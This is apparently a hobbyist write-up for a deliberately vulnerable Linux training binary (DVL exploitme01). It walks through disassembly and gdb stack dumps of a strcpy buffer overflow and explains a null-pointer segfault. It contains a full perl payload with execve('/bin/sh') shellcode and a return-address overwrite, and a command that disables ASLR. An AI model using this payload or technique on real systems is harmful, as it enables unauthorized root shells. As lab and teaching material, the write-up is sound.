Target: CESD DVL Assessment #1	|
Author: digitalbyte	 	|
________________________________|

Tools used:
- gdb (incl mammon gdbinit)
- objdump
- texteditor of your choise


###################################################notice############################################################
#            !!!You don't have to care about this notice if your working with DVL!!!                                #
#to exploit this exploitme for us the beginners it's neccessary to switch off things like Virtual Adress Space      #
#Randomisation (this you can do with:  "echo 0 > /proc/sys/kernel/randomize_va_space" as root) or Pax on our linux- #
#machines. 													    #
#####################################################################################################################


important intro: 

just for your understanding of this here notice: I worked myself through the exploitmes in this order: 02,03,04,05,01. So if you don't understand this here, I recommend to start reading the solution of 01_exploitme02 because it's way!! more detailed than this one. Because as you see I solved it at last, so not much new to learn here about exploiting but I tried to focus to explain the exact happening of the segfault without any input!! here at the end of the solution.

####################################################################################

start:

So start 01_exploitme01 and nothing happens but a segfault. Starting it with a parameter will prevent the segfault. So let's take a deadlisting first:

08048384 <main>:
 8048384:       55                      push   ebp
 8048385:       89 e5                   mov    ebp,esp
 8048387:       81 ec 18 01 00 00       sub    esp,0x118                     ;resizes the stack
 804838d:       83 e4 f0                and    esp,0xfffffff0
 8048390:       b8 00 00 00 00          mov    eax,0x0
 8048395:       29 c4                   sub    esp,eax
 8048397:       8b 45 0c                mov    eax,DWORD PTR [ebp+12]
 804839a:       83 c0 04                add    eax,0x4
 804839d:       8b 00                   mov    eax,DWORD PTR [eax]
 804839f:       89 44 24 04             mov    DWORD PTR [esp+4],eax
 80483a3:       8d 85 f8 fe ff ff       lea    eax,[ebp-0x108]              ; we have 264bytes for strcpy
 80483a9:       89 04 24                mov    DWORD PTR [esp],eax
 80483ac:       e8 ff fe ff ff          call   80482b0 <strcpy@plt>
 80483b1:       b8 00 00 00 00          mov    eax,0x0
 80483b6:       c9                      leave  
 80483b7:       c3                      ret  

We see we can actually 264 bytes put in:

>> `perl -e print' chr(0x41)x264 '`

and everything works fine...

But if we take 268bytes input it segfaults and our experience is telling us, that we messed up ebp. Let's quickcheck that in gdb. Just run it with 264bytes and take a close look at the stack after the strcpy:

gdb> x/80w bffff5a0
0xbffff5a0:     0x4dd5a710      0x4dceace0      0xbffff6c8      0x080483b1
0xbffff5b0:     0xbffff5c0      0xbffff8af      0x4dcff42f      0x0804822a
0xbffff5c0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff5d0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff5e0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff5f0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff600:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff610:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff620:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff630:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff640:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff650:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff660:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff670:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff680:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff690:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff6a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff6b0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff6c0:     0x41414141      0x41414141      0xbffff700<-ebp 0x4dd038cc<-eip
0xbffff6d0:     0x00000002      0xbffff754      0xbffff760      0x4dceb878


You see as we are used to: our_input+fixed_ebp+new_eip will make us happy:)

So just let us take some simple shellcode and combine everything we found out:

`perl -e print' chr(0x41)x209 .chr(0x31).chr(0xc0).chr(0xb0).chr(0x46).chr(0x31).chr(0xdb).chr(0x31).chr(0xc9).chr(0xcd).chr(0x80).chr(0xeb).chr(0x16).chr(0x5b).chr(0x31).chr(0xc0).chr(0x88).chr(0x43).chr(0x07).chr(0x89).chr(0x5b).chr(0x08).chr(0x89).chr(0x43).chr(0x0c).chr(0xb0).chr(0x0b).chr(0x8d).chr(0x4b).chr(0x08).chr(0x8d).chr(0x53).chr(0x0c).chr(0xcd).chr(0x80).chr(0xe8).chr(0xe5).chr(0xff).chr(0xff).chr(0xff).chr(0x2f).chr(0x62).chr(0x69).chr(0x6e).chr(0x2f).chr(0x73).chr(0x68).chr(0x4e).chr(0x41).chr(0x41).chr(0x41).chr(0x41).chr(0x42).chr(0x42).chr(0x42).chr(0x42).chr(0x01).chr(0xf7).chr(0xff).chr(0xbf).chr(0x81).chr(0xf6).chr(0xff).chr(0xbf) '`

and tadaa: a working shell!

###################################################################################

You have to think about ebp, because what's interesting is that here bffff700 seems to mess it up. I think it's because strcpy takes it as stringlimiter so you have to change it. So we simply take bffff701 and everything is fine.. of course we could have taken every other readable adress I think....

###################################################################################

So what is happening here with no input you could ask?

A little searching the net for strcpy brings us:

Library:   string.h

Prototype: char strncpy(char *s1, const char *s2);

Copys a string which s2 points on , to where s1 points.


In the deadlisting we see that eax contains s1 when strcpy is called. And the segfault happens within strcpy. But where is s2 in our scenario?

Let's debugg it with no input and follow into strcpy with "si" and we notice where the error happens:

movzx  eax,BYTE PTR [edx]

So what this code actually does is copying the first byte where edx points to, into eax. But with no input edx contains 00000000 so it tries to read the first byte from the address 0x00000000 what doesn't work of course.. but raises a segfault.

But what is edx here? Let's take AAAA as input and break on this line and take a look into ebp:

gdb> r AAAA
_______________________________________________________________________________
     eax:BFFFF9B3 ebx:4DE1DFF4  ecx:FFFFFD0D  edx:BFFFF9B3     eflags:00200293
     esi:BFFFF6C0 edi:00000000  esp:BFFFF6A4  ebp:BFFFF6A8     eip:4DD5A720
     cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t S z A p C 
[007B:BFFFF6A4]---------------------------------------------------------[stack]
BFFFF6D4 : 10 69 69 0D  03 00 00 00 - 58 F8 FF B7  78 14 CF 4D .ii.....X...x..M
BFFFF6C4 : 00 00 00 00  84 81 04 08 - 8E FF 77 01  18 82 04 08 ..........w.....
BFFFF6B4 : B3 F9 FF BF  2F F4 CF 4D - 2A 82 04 08  00 00 00 00 ..../..M*.......
BFFFF6A4 : E0 AC CE 4D  C8 F7 FF BF - B1 83 04 08  C0 F6 FF BF ...M............
[007B:BFFFF6C0]---------------------------------------------------------[ data]
BFFFF6C0 : 00 00 00 00  00 00 00 00 - 84 81 04 08  8E FF 77 01 ..............w.
BFFFF6D0 : 18 82 04 08  10 69 69 0D - 03 00 00 00  58 F8 FF B7 .....ii.....X...
[0073:4DD5A720]---------------------------------------------------------[ code]
0x4dd5a720 <strcpy+16>: movzx  eax,BYTE PTR [edx]
0x4dd5a723 <strcpy+19>: mov    BYTE PTR [edx+ecx],al
0x4dd5a726 <strcpy+22>: add    edx,0x1
0x4dd5a729 <strcpy+25>: test   al,al
0x4dd5a72b <strcpy+27>: jne    0x4dd5a720 <strcpy+16>
0x4dd5a72d <strcpy+29>: mov    eax,esi
------------------------------------------------------------------------------

Breakpoint 1, 0x4dd5a720 in strcpy () from /lib/tls/i686/cmov/libc.so.6
gdb> x/w bffff9b3
0xbffff9b3:     0x41414141

We see with input: edx contains a pointer (bffff9b3) to our code (0x41414141=AAAA), but without input
there is no pointer in edx and the segfault happens.

######################################################################################

Is this the end? Of course not :) Let's go back to deadlisting again and look intrinsic with the debugger for what happens and we'll get fast behind it:

08048384 <main>:
 8048384:       55                      push   ebp
 8048385:       89 e5                   mov    ebp,esp
 8048387:       81 ec 18 01 00 00       sub    esp,0x118                     
 804838d:       83 e4 f0                and    esp,0xfffffff0
 8048390:       b8 00 00 00 00          mov    eax,0x0
 8048395:       29 c4                   sub    esp,eax
 8048397:       8b 45 0c                mov    eax,DWORD PTR [ebp+12]
 804839a:       83 c0 04                add    eax,0x4
 804839d:       8b 00                   mov    eax,DWORD PTR [eax]          ;s2  
 804839f:       89 44 24 04             mov    DWORD PTR [esp+4],eax
 80483a3:       8d 85 f8 fe ff ff       lea    eax,[ebp-0x108]              ;s1
 80483a9:       89 04 24                mov    DWORD PTR [esp],eax
 80483ac:       e8 ff fe ff ff          call   80482b0 <strcpy@plt>         ;strcpy
 80483b1:       b8 00 00 00 00          mov    eax,0x0
 80483b6:       c9                      leave  
 80483b7:       c3                      ret


We will see that our input will be stored at bffff858 at the beginning, bffff854 will be passed to eax 
mov    eax,DWORD PTR [ebp+12] and then 4 are added to eax and we get bffff858 into eax. bffff858 is a pointer to another pointer (bffff9b3) which points to our input. So mov    eax,DWORD PTR [eax] copies the pointer which eax points to into eax and we get--> s2.

The problem is this line here: mov    eax,DWORD PTR [eax], it copies 4bytes from where eax points to into eax. If we have made input than eax contains a pointer to a pointer to our code. With no input eax contains a point to nothing, so eax will be filled with nothing 0x00000000 and that's what you'll get into edx...


So I hope you like it and understood by bad english ;)


greets

            digitalbyte (http://freenet-homepage.de/31c04031dbcd80/) 









